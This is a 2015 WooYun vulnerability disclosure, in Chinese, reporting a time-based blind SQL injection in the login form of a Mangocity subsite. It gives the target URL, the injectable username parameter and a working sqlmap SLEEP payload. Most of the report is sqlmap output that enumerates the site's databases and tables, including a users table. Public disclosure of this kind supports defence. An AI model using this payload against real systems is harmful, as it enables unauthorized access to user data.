wybug_title: 芒果网某企业功能分站存在SQL注入漏洞（时间盲注可列库）
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-08-31：	细节已通知厂商并且等待厂商处理中									2015-09-05：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 花千骨看的纠结，能不能好好播出呢。 详细说明：  SQL注入，POST类型http://mt.mangocity.com/tcpb/index.php?c=login_controller&m=loginPOST参数：secret=1&username=*username参数存在注入   漏洞证明：  
sqlmap identified the following injection points with a total of 1293 HTTP(s) requests:---Parameter: #1* ((custom) POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: secret=1&username=tencent' AND 3 AND (SELECT * FROM (SELECT(SLEEP(5)))NcLg)-- ApJH21=6 AND '000eQNr'='000eQNr    Vector: AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])---web application technology: PHP 5.3.28back-end DBMS: MySQL 5.0.12current user:    'tuanjian@A0.10/4.58'current database:    'vacation_tuanjian'current user is DBA:    Falseavailable databases [3]:[*] `696E666F726D6174696F6E5F736368656`[*] test[*] vacation_tuanjiansqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: #1* ((custom) POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: secret=1&username=tencent' AND 3 AND (SELECT * FROM (SELECT(SLEEP(5)))NcLg)-- ApJH21=6 AND '000eQNr'='000eQNr    Vector: AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])---web application technology: PHP 5.3.28back-end DBMS: MySQL 5.0.12No tables foundsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: #1* ((custom) POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: secret=1&username=tencent' AND 3 AND (SELECT * FROM (SELECT(SLEEP(5)))NcLg)-- ApJH21=6 AND '000eQNr'='000eQNr    Vector: AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])---web application technology: PHP 5.3.28back-end DBMS: MySQL 5.0.12Database: vacation_tuanjian[9 tables]+--------------------+| ci_sessions        || keyword            || product            || product_mask       || setting            || term_relationships || term_taxonomy      || terms              || users              |+--------------------+
   修复方案：  参数过滤   版权声明：转载请注明来源 路人甲@乌云
